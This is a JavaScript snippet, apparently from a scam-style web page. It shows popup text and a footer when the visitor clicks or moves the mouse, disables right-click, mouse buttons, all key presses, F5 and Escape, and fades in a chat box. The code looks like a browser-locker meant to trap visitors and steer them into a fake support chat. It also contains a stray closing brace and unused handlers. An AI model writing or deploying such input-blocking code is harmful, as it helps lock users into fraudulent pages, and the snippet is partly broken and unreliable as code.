
      $(document).ready(function() {
        $("#mycanvas").click(function() {
          $("#welcomeDiv").show()
        })
      });
   
   
      $(document).ready(function() {
        $("#mycanvas").click(function() {
          $("#poptxt").show()
        })
      });
      $(document).ready(function() {
        $("#cross").click(function() {
          $("#poptxt").show()
        })
      });
    
    
      $(document).ready(function() {
        $("#mycanvas").click(function() {
          $("#footer").show()
        })
      });
      
      
      $(document).ready(function() {
        $("body").mouseover(function() {
          $("#poptxt").show()
        })
      });
    
    
      var isNS = "Netscape" == navigator.appName ? 1 : 0;
      "Netscape" == navigator.appName && document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);

      function mischandler() {
        return !1
      }

      function mousehandler(a) {
        a = isNS ? a : event;
        a = isNS ? a.which : a.button;
        if (2 == a || 3 == a) return !1
      }
     // Disable right-click context menu
document.oncontextmenu = function(e) {
    e = e || window.event;
    return false; // Prevent the context menu from appearing
};

// Disable mouse down and mouse up events
document.onmousedown = function(e) {
    e = e || window.event;
    return false; // Prevent default mouse actions
};

document.onmouseup = function(e) {
    e = e || window.event;
    return false; // Prevent default mouse actions
};

// Disable all key presses
document.onkeydown = function(e) {
    e = e || window.event;
    return false; // Prevent all key actions
};
      };
    
    
      document.addEventListener("keydown", function (event) {
  win_onkeydown_handler(event);
});

function win_onkeydown_handler(event) {
  switch (event.key) {
    case "F5":   // refresh
    case "Escape":
      event.preventDefault();
      break;
  }
}
    
    
      $(document).ready(function() {
        $("#chat").delay(600).fadeIn(100)
      });
   
